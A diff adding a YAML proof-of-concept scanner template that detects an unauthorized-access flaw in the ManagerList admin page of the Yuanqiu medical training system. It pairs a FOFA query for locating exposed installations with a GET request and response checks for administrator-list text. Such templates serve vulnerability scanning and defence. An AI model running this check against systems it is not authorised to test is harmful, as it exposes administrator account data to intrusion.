@@ -1,0 +1,15 @@
+id: poc-yaml-yq-mts-managerlist-unauthorized-access
+info:
+  name: 远秋医学培训系统 ManagerList 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: 远秋医学培训系统
+  fofa: title="远秋医学培训报名系统v1.0"
+requests:
+- method: GET
+  path: /User/ManagerList.aspx?ty=1&ty=1
+  expression: status_code == 200 && contains(body,"管理员设置") && contains(body,"添加人员")
+    && contains(body,"登录号码") && contains(body,"登录类型")
+variables: {}
+transport: http
